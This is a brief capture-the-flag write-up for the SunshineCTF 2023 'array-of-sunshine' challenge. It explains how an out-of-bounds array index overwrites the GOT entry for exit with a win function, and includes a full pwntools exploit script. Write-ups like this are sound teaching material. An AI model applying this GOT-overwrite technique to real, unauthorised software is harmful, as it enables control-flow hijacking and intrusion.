# array-of-sunshine

index out of bound exploit - https://github.com/0x01DA/writeups/tree/master/sunshine2023/array_of_sunshine#readme

Also a video - https://youtu.be/qA6ajf7qZtQ?si=grxsaGEpVWAQzQ7Y&t=1409

- asks for index in global fruits array and you replace one of the fruits
- fruits is in the global section
- need to set index out of bounds
- send index such that it doesn't override the fruits array, it overrides the global offset table (GOT)
- in ghidra we can see a `win` function
- override GOT entry for `exit` with the `win` function

```py
import pwn
import warnings

warnings.filterwarnings(action='ignore', category=BytesWarning)

elf = pwn.ELF('./sunshine')
pwn.context.binary = elf
pwn.context.log_level = 'DEBUG'
pwn.context(terminal=['tmux', 'split-window', '-h'])

libc = elf.libc
p = elf.process()
# p = pwn.remote('chal.2023.sunshinectf.games', '23003')

offset = (elf.got['exit'] - elf.sym['fruits'])//8
print(f'{offset}')

p.sendlineafter(b'>>>', str(offset))
p.sendlineafter('>>>', pwn.p64(elf.sym['win']))

p.interactive()
```
